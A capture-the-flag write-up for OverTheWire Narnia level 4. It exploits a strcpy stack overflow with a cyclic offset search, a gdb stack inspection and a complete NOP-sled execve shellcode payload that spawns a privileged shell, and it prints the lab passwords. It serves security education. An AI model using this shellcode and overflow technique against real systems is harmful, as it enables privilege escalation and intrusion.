# Level 4 -> Level 5  
ssh narnia4@narnia.labs.overthewire.org -p 2226  
Pass: aKNxxrpDc1  
An initial run of the bianry shows the following:  
<img width="452" alt="Screen Shot 2024-01-16 at 6 33 05 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/f775fc2b-ef51-42a6-b0ea-f3f1c488e86c">

Looking at the C source file we see some notable lines of code.  
The first thing we see is a pointer to an environ variable. The environ variable points to environment variables (points to an array of pointers to strings).  
We also see:  
for(i = 0; environ[i] != NULL; i++)  
        memset(environ[i], '\0', strlen(environ[i]));  
These lines of code essentially sets all of the enviornment variables to null. So, this means that we cannot inject our shellcode into an enviornment variable like we did in one of the previous challenges.  
We also see a strcpy which we know is a C function vulnerable to buffer overflows. 
The strcpy copies the first command line argument into the character array named "buffer" which is allocated 256 bytes.   
The goal is to exploit this buffer overflow vulnerability and jump to shellcode. 

The first step in developing our exploit is finding the offset to esp. 
We can assume that is 264 because we have a 256 byte buffer and then another 8 bytes for the base pointer but we can use a cyclic in pwndbg to make sure.  
Using the following commands:
pwndbg ./narnia4  
(gdb) break main   
(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac  
(gdb) c  
(gdb) cyclic -l 0x63616171  
We see the following:  
<img width="627" alt="Screen Shot 2024-01-16 at 6 43 58 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/1d155c52-87c2-48e3-945b-2d0aa36717d2">  

This confirms that the offset is 264 bytes.  
Now we can construct our payload. 
We know we want a NOP sled and a shell so we will use basically the same payload as level 2, but with a few changes.  
One of those changes is the memory address we want to jump to so we must send a bunch of A's (\x41) to the program and see where our input is landing.  
To do this we can use gdb just like in level 2 using the following commands:  
$ gdb ./narnia4  
(gdb) break main  
(gdb) r $(perl -e 'print "\x41"x264 . "\x42\x42\x42\x42";')  
(gdb) c  
(gdb) x/200x $esp  
In which we then see the following:  
<img width="626" alt="Screen Shot 2024-01-16 at 8 00 23 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/918a7128-a5c3-482a-914e-262cac78b255">

We then pick an address close to where our input is landing. 
I will choose 0xffffd710 for this challenge because it is close to the beginning of where our input is landing.  
We will use the same shellcode as in level 2 because we still want a shell.  
Our final payload will be:  
./narnia4 $(perl -e 'print "\x90"x(264-33) . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x10\xd7\xff\xff";')  
Running this command along with:  
$ cat /etc/narnia_pass/narnia5  
We get the password:  
<img width="628" alt="Screen Shot 2024-01-16 at 8 03 22 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/815c902e-d95c-4779-aca4-51d2eb7eaca4">

Pass: 1oCoEkRJSB





